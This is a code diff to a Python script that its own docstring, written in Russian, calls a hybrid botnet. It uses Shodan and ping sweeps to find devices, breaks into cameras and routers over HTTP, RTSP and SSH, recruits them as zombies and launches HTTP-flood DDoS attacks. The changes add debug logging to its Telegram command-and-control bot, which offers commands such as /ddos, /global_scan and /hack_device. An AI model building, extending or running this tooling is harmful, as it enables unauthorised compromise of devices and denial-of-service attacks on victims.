@@ -1,15 +1,14 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-HYBRID BOTNET – SHODAN EDITION (NO TELNETLIB)
-- Глобальный поиск через Shodan
+HYBRID BOTNET – SHODAN EDITION (FIXED)
+- Глобальный поиск через Shodan (опционально)
 - Локальное сканирование (ping sweep)
-- Улучшенный взлом камер/роутеров (HTTP, RTSP, SSH)
+- Взлом камер/роутеров (HTTP, RTSP, SSH)
 - Зомби-ботнет
 - DDoS (HTTP flood)
-- Управление через Telegram
+- Управление через Telegram с отладкой
 - Веб-сервер для Railway
-- Без telnetlib (совместимо с Python 3.13)
 """
 
 import asyncio
@@ -38,7 +37,7 @@ except ImportError:
     print("[!] Shodan not installed. Install with: pip install shodan")
 
 # ------------------------------------------------------------
-#  БАЗОВЫЙ СПИСОК USER-AGENT (без огромного списка)
+#  БАЗОВЫЙ СПИСОК USER-AGENT
 # ------------------------------------------------------------
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
@@ -354,13 +353,19 @@ class AdminBot:
             print("TELEGRAM_TOKEN not set")
             return
         try:
-            from telegram.ext import Application, CommandHandler
+            from telegram.ext import Application, CommandHandler, MessageHandler, filters
         except ImportError:
             print("python-telegram-bot not installed")
             return
         app = Application.builder().token(token).build()
 
+        # Отладочный обработчик для любых текстовых сообщений
+        async def echo(update, context):
+            print(f"Received message: {update.message.text} from {update.effective_user.id}")
+        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, echo))
+
         async def tg_start(update, context):
+            print("Start command received")
             await update.message.reply_text(
                 "Fsociety Ddos:\nБот запущен. Доступные команды:\n"
                 "/ddos <target>\n"
@@ -370,6 +375,7 @@ class AdminBot:
             )
 
         async def tg_ddos(update, context):
+            print("DDoS command received")
             target = context.args[0] if context.args else ""
             if not target:
                 await update.message.reply_text("Использование: /ddos <target>")
@@ -379,6 +385,7 @@ class AdminBot:
             await update.message.reply_text(f"Fsociety Ddos:\nАтака на {target} запущена с {self.botnet.size()} зомби.")
 
         async def tg_global_scan(update, context):
+            print("Global scan command received")
             query = context.args[0] if context.args else "webcam"
             limit = int(context.args[1]) if len(context.args) > 1 else 50
             try:
@@ -397,12 +404,14 @@ class AdminBot:
             await update.message.reply_text(msg)
 
         async def tg_status(update, context):
+            print("Status command received")
             msg = (f"Fsociety Ddos:\nЗомби: {self.botnet.size()}\n"
                    f"Взломано локально: {len(stats['cracked_devices'])}\n"
                    f"Глобально найдено: {stats['global_found']}")
             await update.message.reply_text(msg)
 
         async def tg_hack_device(update, context):
+            print("Hack device command received")
             if len(context.args) < 2:
                 await update.message.reply_text("Использование: /hack_device <ip> <camera|router> [port]")
                 return
